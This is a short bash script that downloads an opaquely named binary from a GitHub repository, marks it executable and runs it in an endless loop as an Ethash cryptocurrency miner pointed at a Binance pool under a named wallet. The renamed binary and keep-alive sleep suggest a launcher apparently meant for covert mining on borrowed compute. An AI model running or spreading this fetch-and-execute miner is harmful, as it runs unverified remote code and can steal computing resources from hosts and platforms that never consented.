#!/bin/bash
POOL=ethash.poolbinance.com:1800
WALLET=Shivamvk.01
WORKER=Shivamvk.01
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
